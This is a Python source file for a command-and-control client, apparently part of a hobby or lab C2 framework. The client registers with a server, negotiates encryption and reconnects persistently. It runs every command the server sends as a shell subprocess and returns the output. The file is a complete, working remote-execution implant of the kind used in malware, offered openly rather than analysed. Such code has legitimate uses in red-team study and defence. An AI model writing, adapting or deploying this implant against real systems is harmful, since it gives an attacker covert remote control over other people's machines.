import asyncio
import logging
import time
import uuid
import argparse
from typing import Optional
from models.message import Message
from models.send_receive_msgs import send_message, receive_message
from models.message_type import MessageType
from models.command_type import CommandType
from models.key_manager import KeyManager
from models.encryption_manager import EncryptionManager
from models.tls_helper import TLSSessionHelper
import helper.subprocess as subprocess_helper
import helper.auth as auth_helper
import helper.helper_funcs as helper_funcs
from models.connection_manager import ConnectionManager

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s|%(funcName)s:%(lineno)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 CLIENT LOGIC ====================


class C2Client:
    """Main C2 Client"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.server_host = server_host
        self.server_port = server_port
        self.client_id = client_id
        self.key_manager = KeyManager()
        self._encryption_manager = None
        self.connection_manager = ConnectionManager(server_host, server_port, client_id)
        self.running = True
        self.command_queue = asyncio.Queue()
        self.talking_queue = asyncio.Queue()
        self._executor_task = None
        self.execution_process = None

    async def _send_register_message(self) -> bool:
        """
        Send registration message to server
        """
        msg = Message.as_register(self.client_id, self.key_manager.serialized_public_key)
        return await send_message(
            self.writer,
            msg.to_payload(True)
        )

    async def _receive_ack_message(self) -> Message:
        msg = await receive_message(self.reader)
        if not msg:
            logger.error("No acknowledgment received")
            return None
        msg = Message.from_payload(msg)
        if not msg:
            logger.error("Failed to parse acknowledgment message")
            return None
        if msg.type is not MessageType.ACK:
            logger.error(f"Unexpected message type: {msg.type}")
            return None
        return msg
    
    async def _set_encryption(self) -> bool:
        """Setup encryption with server's public key"""
        if not await self._send_register_message():
            logger.error("Failed to register client")
            return False
        ack_msg = await self._receive_ack_message()
        if not ack_msg:
            logger.error("Failed to receive acknowledgment from server")
            return False
        session_key = self.key_manager.compute_session_key(ack_msg.command)
        self._encryption_manager = EncryptionManager(session_key)
        logger.info(f"Registered as {ack_msg.client_id}")
        return True

    async def _lifecycle(self):
        """
        Main client loop
        """
        listener = asyncio.create_task(self._listener(), name='listener')
        talker = asyncio.create_task(self._talker(), name='talker')

        try:
            await listener # Wait for listener to detect disconnect
        except asyncio.CancelledError:
            logger.info("Lifecycle detected cancellation")
            self.running = False
        except asyncio.IncompleteReadError:
            logger.info("Lifecycle detected server closed connection")
        except Exception as e:
            logger.error(f"Lifecycle detected an error: {e}")
        finally:
            # Connection is dead - clean up
            await helper_funcs.cancel_task(talker, related_queue=self.talking_queue)
            
    async def _listener(self):
        """
        Listen for incoming commands from server
        """
        try:
            while self.running:
                encrypted_message = await receive_message(self.reader)
                if not encrypted_message:
                    logger.warning(f"Received an empty message")
                    break
                    
                msg = self._encryption_manager.decrypt(encrypted_message)
                if not msg:
                    logger.warning(f"Failed to decrypt message")
                    break
                
                if msg.type is not MessageType.COMMAND:
                    logger.warning(f"Unknown message type: {msg.type}")
                    continue

                logger.info(f"Received command: {msg.command}, id: {msg.cmd_id}")
                if msg.command == CommandType.KILL.value:  # TODO
                    await self._handle_received_kill_command()
                await self._enqueue_command(msg)  # Queue command for execution
            else:
                logger.info("listener exiting | client not running")
        
        except asyncio.CancelledError:
            logger.info('listener cancelled')
            raise
        except asyncio.IncompleteReadError:
            if self.running:
                logger.info("Server closed connection")
                raise
        except Exception as e:
            logger.error(f"Command listener error: {e}")
            raise
        finally:
            logger.info("Listener finished")

    async def _executor(self):
        """
        Execute commands from queue
        """
        try:
            while self.running:
                command_data = await self._dequeue_command()
                if command_data is None:
                    break
                result_data = await self._process_command(command_data)
                await self._enqueue_result(result_data)
            else:
                logger.info("Executor exiting | client not running")
            
        except asyncio.CancelledError:
            logger.info('Executor cancelled')
            raise
        except Exception as e:
            logger.error(f"Executor error: {e}")
            raise
        finally:
            logger.info("Executor finished")

    async def _talker(self):
        try:
            while self.running:
                result_data = await self._dequeue_result()
                await self._send_result(result_data) # Send result back to server
            else:
                logger.info("talker exiting | client not running")
        except asyncio.CancelledError:
            logger.info("talker cancelled")
            raise
        except Exception as e:
            await self.talking_queue.put(result_data)  # Re-queue unsent data
            logger.error(f"Talker error: {e}")
            raise
        finally:
            logger.info("Talker finished")

    async def _send_result(self, result_data: tuple[str, str, str]) -> bool:
        command_id, result, execution_time_ms = result_data
        msg = Message.as_result(command_id, result, execution_time_ms)
        msg = self._encryption_manager.encrypt(msg)
        if await send_message(
            self.writer,
            msg
        ):
            logger.info(f"[cmd id: {command_id}] Result sent ({execution_time_ms:.1f}ms)")
            return True
        logger.info(f"[cmd id: {command_id}] Failed to send result")
        return False

    async def _handle_received_kill_command(self) -> None:
        await self._terminate_execution_process()
        logger.info('Draining command queue')
        helper_funcs.drain_queue(self.command_queue)
        logger.info('Draining talking queue')
        helper_funcs.drain_queue(self.talking_queue)
        self.running = False

    async def _enqueue_command(self, message: Message) -> None:
        await self.command_queue.put({
            "cmd_id": message.cmd_id,
            "command": message.command
        })

    async def _dequeue_command(self) -> tuple[str, str]:
        """
        Fetch command from queue
        """
        command_data: dict = await self.command_queue.get()
        if command_data is None:
            logger.info("Received None from queue")
            return None
        command_id: str = command_data.get("cmd_id")
        command: str = command_data.get("command", "").lower()
        logger.info(f"Processing command: {command}")
        return command_id, command

    async def _enqueue_result(self, result_data: tuple[str, str, str]) -> None:
        command_id, result, exec_time_ms = result_data
        await self.talking_queue.put({
            "cmd_id": command_id,
            "result": result,
            "exec_time_ms": exec_time_ms
        })

    async def _dequeue_result(self) -> tuple[str, str, str]:
        """
        Fetch result from queue
        """
        result_data: dict = await self.talking_queue.get()
        if result_data is None:
            return None, None, None
        command_id: str = result_data.get("cmd_id", "?")
        result: str = result_data.get("result", "?")
        exec_time_ms: str = result_data.get("exec_time_ms", "?")
        return command_id, result, exec_time_ms

    async def _process_command(self, command_data: tuple[str, str]) -> tuple[str, float]:
        cmd_id, command = command_data
        start_time = time.monotonic()
        if command == CommandType.KILL.value:  # TODO
            result = "Client killed by server"
        else:
            result = await self._execute_command(cmd_id, command)  # Run asynchronously with subprocess
        exec_time_ms = (time.monotonic() - start_time) * 1000
        logger.info(f"Executed: {command} ({exec_time_ms:.1f}ms)")
        return cmd_id, result, exec_time_ms

    async def _execute_command(self, cmd_id: str, command: str) -> str:
        """
        Execute bash-style command
        """
        try:
            self.execution_process = await subprocess_helper.create_subprocess(command)
            logger.info(f"[cmd id: {cmd_id}] Execution process created (pid: {self.execution_process.pid})")
            output = await subprocess_helper.communicate_subprocess(self.execution_process)
            self.execution_process = None
            return output
        except asyncio.CancelledError:
            await self._terminate_execution_process()
            raise            
        except Exception as e:
            logger.info(f"Command execution error: {str(e)}")
            raise

    async def _terminate_execution_process(self):
        """Terminate execution process if it exists"""
        if not self.execution_process:
            return
        try:
            pid = self.execution_process.pid
            await subprocess_helper.terminate_subprocess_gracefully(self.execution_process)
            self.execution_process = None
            logger.info(f"Terminated execution process gracefully (pid: {pid})")
        except asyncio.TimeoutError:
            logger.error("Graceful termination timed out")
        except Exception as e:
            logger.error(f"Error gracefully terminating process: {e}")
        finally:
            if not self.execution_process:
                return
            try:
                await subprocess_helper.terminate_subprocess_forcefully(self.execution_process)
                self.execution_process = None
                logger.info(f"Terminated execution process forcefully (pid: {pid})")
            except Exception as e:
                logger.error(f"Error forcefully terminating process: {e}")

    @property
    def writer(self):
        return self.connection_manager.writer

    @property
    def reader(self):
        return self.connection_manager.reader

    async def _terminate(self):
        await helper_funcs.cancel_task(self._executor_task)
        await self._terminate_execution_process()
        await self.connection_manager.close()

    async def _authenticate_and_secure(self) -> None:
        """Authenticate server and setup encryption"""
        if not auth_helper.validate_server_certificate(self.writer):
            self.running = False  # no point in endless connection loops
            raise ConnectionError("Server certificate is not valid")
        if not await self._set_encryption():
            raise ConnectionError("Failed to set encryption")

    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        try:
            self._executor_task = asyncio.create_task(self._executor(), name='executor')
            while self.running:
                await self.connection_manager.reconnection_loop()
                await self._authenticate_and_secure()
                await self._lifecycle()
            else:
                logger.info("Client exiting | client not running")
        except asyncio.CancelledError:
            logger.info("Client start cancelled")
        except ConnectionError as e:
            logger.error(f"Client start connection error: {e}")
        except Exception as e:
            logger.error(f"Client start error: {e}")
        finally:
            await self._terminate()
            logger.info("C2 Client stopped")

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown")
        client.running = False

if __name__ == "__main__":
    asyncio.run(main())